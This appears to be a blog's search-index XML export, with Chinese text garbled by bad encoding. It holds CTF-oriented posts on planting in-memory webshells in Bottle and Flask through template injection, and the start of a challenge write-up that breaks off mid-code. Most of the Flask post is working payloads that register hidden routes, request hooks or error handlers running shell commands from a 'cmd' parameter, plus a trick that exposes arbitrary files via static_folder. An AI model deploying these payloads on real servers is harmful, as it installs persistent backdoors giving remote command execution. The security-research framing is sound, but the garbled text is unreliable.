<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Javaå†…å­˜é©¬</title>
    <link href="/2025/05/22/Java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/05/22/Java%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<p>dd</p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bottleå†…å­˜é©¬è¯¦è§£</title>
    <link href="/2025/05/11/Bottle%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/11/Bottle%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ç¯‡ä»¥Bottleçš„SimpleTemplate sstiç ”ç©¶å†…å­˜é©¬</p><p>å¤§æ¦‚çœ‹äº†ä¸‹è·Ÿflaskå·®ä¸å¤šå‘¢ï¼Œæ‘†äº†ï¼Œä¸‹ç­</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@app.route(&#x27;/shell&#x27;)</span><br><span class="hljs-string">def g():</span><br><span class="hljs-string">    return __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;&quot;&quot;</span>,&#123;<span class="hljs-string">&quot;app&quot;</span>:<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Flaskå†…å­˜é©¬è¯¦è§£</title>
    <link href="/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ç¯‡ä»¥jinja2 sstiè§†è§’ç ”ç©¶Flaské«˜ç‰ˆæœ¬å†…å­˜é©¬</p><h2 id="æ‹¿requestå¯¹è±¡"><a href="#æ‹¿requestå¯¹è±¡" class="headerlink" title="æ‹¿requestå¯¹è±¡"></a>æ‹¿requestå¯¹è±¡</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;flask&quot;</span>).request.args.get(<span class="hljs-string">&quot;cmd&quot;</span>) <span class="hljs-comment">#ç›´æ¥ä»flaskæ‹¿</span><br>ur1_for.__globals__[<span class="hljs-string">&#x27;request&#x27;</span>]<span class="hljs-comment">#ä»flaskçš„ä¸€äº›å‡½æ•°çš„__globals__é‡Œæ‹¿</span><br>request_ctx.request.args.get  <span class="hljs-comment">#request_ctxçš„å±æ€§</span><br></code></pre></td></tr></table></figure><h2 id="app-view-functionsç›¸å…³"><a href="#app-view-functionsç›¸å…³" class="headerlink" title="app.view_functionsç›¸å…³"></a>app.view_functionsç›¸å…³</h2><p>å› ä¸ºé«˜ç‰ˆæœ¬ç»™add_url_ruleåŠ äº†è£…é¥°å™¨<code>@setupmethod</code>ï¼Œè¿™ä¸ªè£…é¥°å™¨ä¼šå…ˆè°ƒç”¨<code>app._check_setup_finished</code>, æ‰€ä»¥å¾—å°†<code>app._got_first_request</code>æ”¹ä¸ºFalse</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_check_setup_finished</span>(<span class="hljs-params">self, f_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>._got_first_request:<br>        <span class="hljs-keyword">raise</span> AssertionError(<br>            <span class="hljs-string">f&quot;The setup method &#x27;<span class="hljs-subst">&#123;f_name&#125;</span>&#x27; can no longer be called&quot;</span><br>            <span class="hljs-string">&quot; on the application. It has already handled its first&quot;</span><br>            <span class="hljs-string">&quot; request, any changes will not be applied&quot;</span><br>            <span class="hljs-string">&quot; consistently.\n&quot;</span><br>            <span class="hljs-string">&quot;Make sure all imports, decorators, functions, etc.&quot;</span><br>            <span class="hljs-string">&quot; needed to set up the application are done before&quot;</span><br>            <span class="hljs-string">&quot; running it.&quot;</span><br>        )<br></code></pre></td></tr></table></figure><h4 id="è·¯ç”±è£…é¥°å™¨"><a href="#è·¯ç”±è£…é¥°å™¨" class="headerlink" title="è·¯ç”±è£…é¥°å™¨"></a>è·¯ç”±è£…é¥°å™¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&#x27;app._got_first_request=False</span><br><span class="hljs-string">@app.get(&quot;/dd&quot;)#å…¶ä»–çš„åº”è¯¥éƒ½å¯ä»¥</span><br><span class="hljs-string">def cmd():</span><br><span class="hljs-string">    return __import__(&quot;os&quot;).popen(__import__(&quot;flask&quot;).request.args.get(&quot;cmd&quot;)).read()&#x27;</span>,&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&#x27;app._got_first_request=False</span><br><span class="hljs-string">def cmd():</span><br><span class="hljs-string">    return __import__(&quot;os&quot;).popen(__import__(&quot;flask&quot;).request.args.get(&quot;cmd&quot;)).read()</span><br><span class="hljs-string">app.get(&quot;/dd&quot;)(cmd)&#x27;</span>,&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule"></a>add_url_rule</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&#x27;app._got_first_request=False</span><br><span class="hljs-string">def cmd():</span><br><span class="hljs-string">    return __import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span><br>app.add_url_rule(<span class="hljs-string">&quot;/ss&quot;</span>,<span class="hljs-string">&quot;cmd&quot;</span>,cmd)<span class="hljs-comment">#ä½¿ç”¨lambdaè¡¨è¾¾å¼ä¹Ÿok</span><br>,&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="add-url-ruleæœ€åè¿˜æ˜¯è°ƒç”¨url-map-add-rule-obj-ç„¶åview-functions-endpoint-view-func"><a href="#add-url-ruleæœ€åè¿˜æ˜¯è°ƒç”¨url-map-add-rule-obj-ç„¶åview-functions-endpoint-view-func" class="headerlink" title="add_url_ruleæœ€åè¿˜æ˜¯è°ƒç”¨url_map.add(rule_obj)ç„¶åview_functions[endpoint] = view_func"></a>add_url_ruleæœ€åè¿˜æ˜¯è°ƒç”¨<code>url_map.add(rule_obj)</code>ç„¶å<code>view_functions[endpoint] = view_func</code></h4><p>è¿™é‡Œå°±ä¸ç”¨æ”¹<code>app._got_first_request=False</code>å•¦</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<br>    <span class="hljs-string">&quot;app.url_map.add(app.url_rule_class(&#x27;/shell&#x27;, methods=[&#x27;GET&#x27;], endpoint=&#x27;shell&#x27;));app.view_functions.update(&#123;&#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;)&quot;</span>,<span class="hljs-comment">#æˆ–è€…app.view_functions[&quot;shell&quot;]=lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()</span><br>    &#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;<br>)<br></code></pre></td></tr></table></figure><h4 id="endpointè£…é¥°å™¨ä¼šview-functions-endpoint-view-funcï¼Œä½†æ˜¯æœ‰-setupmethod"><a href="#endpointè£…é¥°å™¨ä¼šview-functions-endpoint-view-funcï¼Œä½†æ˜¯æœ‰-setupmethod" class="headerlink" title="endpointè£…é¥°å™¨ä¼šview_functions[endpoint] = view_funcï¼Œä½†æ˜¯æœ‰@setupmethod"></a>endpointè£…é¥°å™¨ä¼š<code>view_functions[endpoint] = view_func</code>ï¼Œä½†æ˜¯æœ‰@setupmethod</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;app._got_first_request=False</span><br><span class="hljs-string">app.url_map.add(app.url_rule_class(&#x27;/shell&#x27;, methods=[&#x27;GET&#x27;], endpoint=&#x27;shell&#x27;))</span><br><span class="hljs-string">@app.endpoint(&#x27;shell&#x27;)</span><br><span class="hljs-string">def f():</span><br><span class="hljs-string">return __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>,<br>    &#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;<br>)<br></code></pre></td></tr></table></figure><p>åæ­£è€å¤šäº†æ¯”å¦‚<code>_method_route(&quot;PATCH&quot;, rule, options)</code></p><h4 id="åŠ«æŒè·¯ç”±å‡½æ•°"><a href="#åŠ«æŒè·¯ç”±å‡½æ•°" class="headerlink" title="åŠ«æŒè·¯ç”±å‡½æ•°"></a>åŠ«æŒè·¯ç”±å‡½æ•°</h4><p>æ¯”å¦‚å­˜åœ¨</p><p>@app.route(â€œ&#x2F;â€œ)<br>        def index():</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<br>    <span class="hljs-string">&quot;app.view_functions[&#x27;index&#x27;] = lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>,<span class="hljs-comment">#è¿™é‡Œçš„indexæ˜¯ä½ çš„è·¯ç”±è£…é¥°å‡½æ•°</span><br>    &#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;<br>)<br></code></pre></td></tr></table></figure><h2 id="app-before-request-funcsç›¸å…³"><a href="#app-before-request-funcsç›¸å…³" class="headerlink" title="app.before_request_funcsç›¸å…³"></a>app.before_request_funcsç›¸å…³</h2><p>è¿™å‡½æ•°ä¹Ÿè£…é¥°äº†@setupmethod</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;app._got_first_request=False</span><br><span class="hljs-string">@app.before_request</span><br><span class="hljs-string">def f():</span><br><span class="hljs-string">return __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>,<br>&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)<br></code></pre></td></tr></table></figure><p>å‘before_request_funcså­—å…¸é‡ŒåŠ </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">app.before_request_funcs.setdefault(<span class="hljs-literal">None</span>, []).append(<span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read())<br></code></pre></td></tr></table></figure><h2 id="app-after-request-funcsç›¸å…³"><a href="#app-after-request-funcsç›¸å…³" class="headerlink" title="app.after_request_funcsç›¸å…³"></a>app.after_request_funcsç›¸å…³</h2><p>å‡½æ•°åªèƒ½è¿”å›responseå¯¹è±¡</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;app._got_first_request=False</span><br><span class="hljs-string">@app.after_request</span><br><span class="hljs-string">def f(c):</span><br><span class="hljs-string">return __import__(&#x27;flask&#x27;).Response(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>,<span class="hljs-comment">#app.make_responseå¯ä»¥ç›´æ¥ç”ŸæˆResponseï¼Œå¥½å¤šå‡½æ•°éƒ½èƒ½è¿”å›Responseï¼Œä½†æ˜¯ä¸å¤ªå¥½æ„é€ </span><br>&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>å‘after_request_funcså­—å…¸é‡ŒåŠ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.after_request_funcs.setdefault(<span class="hljs-literal">None</span>, []).append(<span class="hljs-keyword">lambda</span> x:<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;flask&#x27;</span>).Response(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()))<br></code></pre></td></tr></table></figure><h2 id="app-error-handler-specç›¸å…³"><a href="#app-error-handler-specç›¸å…³" class="headerlink" title="app.error_handler_specç›¸å…³"></a>app.error_handler_specç›¸å…³</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;app._got_first_request=False</span><br><span class="hljs-string">@app.errorhandler(404)</span><br><span class="hljs-string">def error_handler(d):</span><br><span class="hljs-string">    return __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>,<br>&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;app._got_first_request=False</span><br><span class="hljs-string">app.register_error_handler(404,lambda e:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>,<br>&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda error:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>, &#123;<span class="hljs-string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;request&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>app.teardown_request ï¼ˆæ— å›æ˜¾å‘€,æ„Ÿè§‰æ²¡å•¥æ„ä¹‰ï¼‰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;app._got_first_request=False</span><br><span class="hljs-string">@app.teardown_request</span><br><span class="hljs-string">def f(x):</span><br><span class="hljs-string">return __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>,<br>&#123;<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)<br></code></pre></td></tr></table></figure><p>é‡å†™æŸäº›æ¯æ¬¡è¯·æ±‚éƒ½ä¼šæ‰§è¡Œçš„å‡½æ•°ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒå±é™©ï¼Œè€Œä¸”ä¸å®¹æ˜“æœ‰å›æ˜¾</p><h2 id="å›æ˜¾ç›¸å…³"><a href="#å›æ˜¾ç›¸å…³" class="headerlink" title="å›æ˜¾ç›¸å…³"></a>å›æ˜¾ç›¸å…³</h2><p>å¯ä»¥å¯¹Responseç±»åšæ›´æ”¹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">Response.default_status=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br>Response.default_mimetype=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å¯¹Responseå¯¹è±¡çš„æ›´æ”¹ï¼ˆæœ‰äº›åªåšäº†ç±»å‹æ ‡å‡†ï¼Œæ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§å°±åªèƒ½æ”¹å“åº”å¯¹è±¡å•¦ï¼‰,ä½†æ˜¯æ¯æ¬¡è¯·æ±‚éƒ½åˆ›å»ºæ–°å“åº”å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—è¿™ä¸ªä½œç”¨ä¸å¤§ï¼Œæœ¬è´¨ä¸Šè·Ÿç”Ÿæˆå“åº”æ²¡å•¥åŒºåˆ«</p><h2 id="é¢˜å¤–"><a href="#é¢˜å¤–" class="headerlink" title="é¢˜å¤–"></a>é¢˜å¤–</h2><p>æ”¹static_folderè¯»ä»»æ„æ–‡ä»¶</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">app.static_url_path=<span class="hljs-string">&quot;/static&quot;</span>;app.static_folder=<span class="hljs-string">&quot;/&quot;</span>   <span class="hljs-comment">#ç„¶åstatic/app.pyè¯»æºç </span><br></code></pre></td></tr></table></figure><p>å…ˆå†™è¿™ä¹ˆå¤šï¼Œåé¢å†æ›´ï¼Ÿ</p><p>ç°æˆçš„Pythonå†…å­˜é©¬ç®¡ç†å·¥å…·ï¼š<a href="https://github.com/orzchen/PyMemShell">https://github.com/orzchen/PyMemShell</a></p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP</title>
    <link href="/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/"/>
    <url>/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/</url>
    
    <content type="html"><![CDATA[<p>å‡ºäº†3é“é¢˜ï¼Œæœ¬æ¥PyJailçš„åŸå‹æ˜¯PyBox Revengeï¼Œä½†æ˜¯Webé¢˜å¤šäº†ï¼ŒMiscé¢˜ä¸å¤ªå¤Ÿå°±æ”¹æˆPyJailæ”¾Miscäº†ï¼ˆé¢å‡ºå‡ºæ¥è‡ªå·±æ‰“äº†ä¸€ä¸‹åˆï¼‰</p><h2 id="GuessOneGuess-Web"><a href="#GuessOneGuess-Web" class="headerlink" title="GuessOneGuess-Web"></a>GuessOneGuess-Web</h2><p>ç­¾åˆ°é¢˜</p><p>åç«¯å…³é”®ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">io</span>) &#123;<br>    io.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">socket</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">let</span> targetNumber = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">let</span> guessCount = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">let</span> totalScore = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-string">&quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ–°è¿æ¥ - ç›®æ ‡æ•°å­—: <span class="hljs-subst">$&#123;targetNumber&#125;</span>`</span>);<br>        <br>        socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;çŒœä¸€ä¸ª1-100ä¹‹é—´çš„æ•°å­—ï¼&#x27;</span>,<br>            <span class="hljs-attr">score</span>: totalScore<br>        &#125;);<br>        <br>        socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;guess&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(totalScore);<br>                <span class="hljs-keyword">const</span> guess = <span class="hljs-built_in">parseInt</span>(data.<span class="hljs-property">value</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(guess)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—&#x27;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (guess &lt; <span class="hljs-number">1</span> || guess &gt; <span class="hljs-number">100</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥1-100ä¹‹é—´çš„æ•°å­—&#x27;</span>);<br>                &#125;<br><br>                guessCount++;<br><br>                <span class="hljs-keyword">if</span> (guess === targetNumber) &#123;<br>                    <span class="hljs-keyword">const</span> currentScore = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">100</span> / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, guessCount - <span class="hljs-number">1</span>));<br>                    totalScore += currentScore;<br><br>                    <span class="hljs-keyword">let</span> message = <span class="hljs-string">`ğŸ‰ çŒœå¯¹äº†ï¼å¾—åˆ† +<span class="hljs-subst">$&#123;currentScore&#125;</span> (æ€»åˆ†æ•°: <span class="hljs-subst">$&#123;totalScore&#125;</span>)`</span>;<br>                    <span class="hljs-keyword">let</span> showFlag = <span class="hljs-literal">false</span>;<br><br>                    <span class="hljs-keyword">if</span> (totalScore &gt; <span class="hljs-number">1.7976931348623157e308</span>) &#123;<br>                        message += <span class="hljs-string">`\nğŸ´ <span class="hljs-subst">$&#123;FLAG&#125;</span>`</span>;<br>                        showFlag = <span class="hljs-literal">true</span>;<br>                    &#125;<br><br>                    socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>                        <span 